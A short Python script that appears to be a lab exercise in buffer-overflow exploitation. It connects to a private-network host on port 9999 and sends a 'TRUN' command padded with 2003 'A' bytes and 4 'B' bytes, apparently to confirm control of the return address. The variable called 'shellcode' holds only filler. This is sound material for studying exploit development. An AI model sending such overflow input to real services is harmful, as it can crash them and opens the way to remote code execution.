#!/usr/bin/python3
import sys, socket

rhost = "192.168.10.6"
rport = 9999
shellcode = b"A" * 2003 + b"B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost, rport))
    
    s.send((b'TRUN /.:/' + shellcode))
    s.close()
    
except:
    print ("Error connecting to the server.")
    sys.exit()
